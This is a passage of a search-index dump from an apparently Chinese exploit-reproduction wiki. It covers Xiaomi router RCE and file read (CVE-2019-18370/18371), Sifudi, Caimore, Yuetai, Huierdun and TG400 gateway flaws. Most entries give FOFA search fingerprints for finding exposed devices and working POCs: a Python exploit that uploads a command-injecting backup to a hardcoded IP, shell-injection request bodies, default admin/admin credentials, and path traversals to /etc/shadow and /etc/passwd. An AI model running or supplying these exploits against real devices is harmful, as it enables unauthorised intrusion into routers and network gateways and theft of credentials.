","date":"0001-01-01","objectID":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/:5:0","tags":null,"title":"","uri":"/%E5%AE%8F%E7%94%B5-h8922-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-28151/"},{"categories":null,"content":"小米 路由器 c_upload 远程命令执行漏洞 CVE-2019-18370 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/:0:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/"},{"categories":null,"content":"漏洞描述 小米路由器存在接口，备份文件是tar.gz格式的，上传后tar zxf解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/:1:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/"},{"categories":null,"content":"漏洞影响 小米 路由器 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/:2:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/"},{"categories":null,"content":"网络测绘 app=\"小米路由器\" ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/:3:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC import os import tarfile import requests # proxies = {\"http\":\"http://127.0.0.1:8080\"} proxies = {} ## get stok stok = input(\"stok: \") ## make config file command = input(\"command: \") speed_test_filename = \"speedtest_urls.xml\" with open(\"template.xml\",\"rt\") as f: template = f.read() data = template.format(command=command) # print(data) with open(\"speedtest_urls.xml\",'wt') as f: f.write(data) with tarfile.open(\"payload.tar.gz\", \"w:gz\") as tar: # tar.add(\"cfg_backup.des\") # tar.add(\"cfg_backup.mbu\") tar.add(\"speedtest_urls.xml\") ## upload config file print(\"start uploading config file ...\") r1 = requests.post(\"http://101.249.46.7:8098/cgi-bin/luci/;stok={}/api/misystem/c_upload\".format(stok), files={\"image\":open(\"payload.tar.gz\",'rb')}, proxies=proxies) # print(r1.text) ## exec download speed test, exec command print(\"start exec command...\") r2 = requests.get(\"http://101.249.46.7:8098/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed\".format(stok), proxies=proxies) # print(r2.text) ## read result file r3 = requests.get(\"http://101.249.46.7:8098/api-third-party/download/extdisks../tmp/1.txt\", proxies=proxies) if r3.status_code == 200: print(\"success, vul\") print(r3.text) template.xml 文件 \u003c?xml version=\"1.0\"?\u003e \u003croot\u003e \u003cclass type=\"1\"\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003citem url=\"http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat\"/\u003e \u003c/class\u003e \u003cclass type=\"2\"\u003e \u003citem url=\"http://192.168.31.1 -q -O /dev/null;{command}\u003e/tmp/1.txt;\"/\u003e \u003c/class\u003e \u003cclass type=\"3\"\u003e \u003citem uploadurl=\"http://www.taobao.com/\"/\u003e \u003citem uploadurl=\"http://www.so.com/\"/\u003e \u003citem uploadurl=\"http://www.qq.com/\"/\u003e \u003citem uploadurl=\"http://www.sohu.com/\"/\u003e \u003citem uploadurl=\"http://www.tudou.com/\"/\u003e \u003citem uploadurl=\"http://www.360doc.com/\"/\u003e \u003citem uploadurl=\"http://www.kankan.com/\"/\u003e \u003citem uploadurl=\"http://www.speedtest.cn/\"/\u003e \u003c/class\u003e \u003c/root\u003e 接口为后台权限接口，需要通过任意文件读取漏洞获取 stok ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/:4:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-c_upload-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-18370/"},{"categories":null,"content":"小米 路由器 extdisks 任意文件读取漏洞 CVE-2019-18371 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/:0:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/"},{"categories":null,"content":"漏洞描述 小米 路由器存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/:1:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/"},{"categories":null,"content":"漏洞影响 小米 路由器 ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/:2:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/"},{"categories":null,"content":"网络测绘 app=\"小米路由器\" ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/:3:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /api-third-party/download/extdisks../etc/shadow ","date":"0001-01-01","objectID":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/:4:0","tags":null,"title":"","uri":"/%E5%B0%8F%E7%B1%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-extdisks-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-18371/"},{"categories":null,"content":"思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞。 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 思福迪 运维安全管理系统 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"思福迪-LOGBASE\" ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /bhost/test_qrcode_b HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36 Content-Length: 23 Connection: close Content-Type: application/x-www-form-urlencoded Referer: http://xxx.xxx.xxx.xxx Accept-Encoding: gzip z1=1\u0026z2=\"|id;\"\u0026z3=bhost ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"悦泰节能 智能数据网关 resources 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 悦泰节能 智能数据网关存在任意文件读取漏洞，通过构造特殊请求可以读取服务器任意文件 ","date":"0001-01-01","objectID":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 悦泰节能 智能数据网关 ","date":"0001-01-01","objectID":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/FWlib3/resources/css/xtheme-gray.cssz\" ","date":"0001-01-01","objectID":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /FWlib3/resources//../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"惠尔顿 e地通 config.xml 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 惠尔顿 e地通Socks5 VPN登录系统 存在信息泄漏漏洞，访问特殊的Url即可获取管理员账号密码 ","date":"0001-01-01","objectID":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 惠尔顿 e地通Socks5 VPN登录系统 ","date":"0001-01-01","objectID":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"惠尔顿-e地通VPN\" ","date":"0001-01-01","objectID":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 访问 /backup/config.xml， 泄漏用户信息 ","date":"0001-01-01","objectID":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%83%A0%E5%B0%94%E9%A1%BF-e%E5%9C%B0%E9%80%9A-config.xml-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"才茂通信 网关 formping 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 才茂通信网关 formping 接口存在远程命令执行漏洞，攻击者通过默认口令 admin/admin 登陆系统后通过命令可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 才茂通信 网关 ","date":"0001-01-01","objectID":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"CAIMORE-Gateway\" ","date":"0001-01-01","objectID":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面，默认口令 admin/admin 验证POC POST /goform/formping Authorization: Basic YWRtaW46YWRtaW4= PingAddr=www.baidu.com%7Cls\u0026PingPackNumb=1\u0026PingMsg= ","date":"0001-01-01","objectID":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%89%8D%E8%8C%82%E9%80%9A%E4%BF%A1-%E7%BD%91%E5%85%B3-formping-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"朗视 TG400 GSM 网关目录遍历 CVE-2021-27328 ","date":"0001-01-01","objectID":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/:0:0","tags":null,"title":"","uri":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/"},{"categories":null,"content":"漏洞描述 朗视 TG400 GSM 网关存在目录遍历 ，攻击者可以通过漏洞获取敏感信息 ","date":"0001-01-01","objectID":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/:1:0","tags":null,"title":"","uri":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/"},{"categories":null,"content":"漏洞影响 朗视 TG400 GSM 网关 ","date":"0001-01-01","objectID":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/:2:0","tags":null,"title":"","uri":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/"},{"categories":null,"content":"漏洞复现 暂无FOFA语句及固件设备复现 获取固件解密密码 http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwd： http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/:3:0","tags":null,"title":"","uri":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/"},{"categories":null,"content":"参考文章 https://github.com/SQSamir/CVE-2021-27328 ","date":"0001-01-01","objectID":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/:4:0","tags":null,"title":"","uri":"/%E6%9C%97%E8%A7%86-tg400-gsm-%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-cve-2021-27328/"},{"categories":null,"content":"浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞 